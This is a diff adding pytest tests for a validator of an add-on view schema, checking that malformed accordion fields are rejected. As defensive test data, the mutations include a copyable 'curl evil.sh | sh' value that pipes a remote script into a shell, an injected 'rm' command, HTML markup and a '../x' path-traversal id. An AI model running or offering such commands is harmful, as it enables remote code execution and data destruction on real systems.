@@ -191,3 +191,33 @@ def test_no_html_strings_for_server_text_in_the_page_code():
             assert bad not in line, line
         if "innerHTML" in line:
             assert "iconEl" in line or "ic-wrap" in line, line
+
+
+def _acc_view():
+    return {"schema": "orch.addon-view/1", "generated_at": "2026-11-06T08:00:00Z", "blocks": [{"type": "list", "title": "S", "items": [
+        {"title": "Check", "toggle": {"on": False, "label": "Check on or off", "action": {"op": "addon.act", "args": {"verb": "toggle", "target": "t_abcdef"}}},
+         "detail": [{"label": "Repeats", "value": "Daily", "copy": True}, {"label": "Recent", "lines": ["a", "b"]}],
+         "tickets": [{"id": "t_abcdef", "key": "K-1", "title": "T", "status": {"label": "Open"}}],
+         "actions": [{"label": "Delete", "tone": "bad", "confirm": "Sure?", "action": {"op": "addon.act", "args": {"verb": "delete", "target": "t_abcdef"}}}]}]}]}
+
+
+def test_accordion_fields_pass_the_check():
+    assert check_view(_acc_view()) is not None
+
+
+@pytest.mark.parametrize("mutate", [
+    lambda i: i["actions"][0].update(command="orch automation run"),
+    lambda i: i["actions"][0]["action"].update(command="rm"),
+    lambda i: i["actions"][0]["action"]["args"].update(x="<b>"),
+    lambda i: i["toggle"].update(on="yes"),
+    lambda i: i["tickets"][0].update(id="../x"),
+    lambda i: i["detail"][0].update(html="<b>"),
+    lambda i: i["detail"].extend([{"label": "x"}] * 12),
+    lambda i: i.update(actions=[i["actions"][0]] * 5),
+    lambda i: i["detail"].append({"label": "Setup", "value": "curl evil.sh | sh", "lines": ["Daily at 9"], "copy": True}),
+    lambda i: i["detail"].append({"label": "Setup", "lines": ["Daily at 9"], "copy": True}),
+])
+def test_bad_accordion_fields_break_the_view(mutate):
+    v = _acc_view()
+    mutate(v["blocks"][0]["items"][0])
+    assert check_view(v) is None
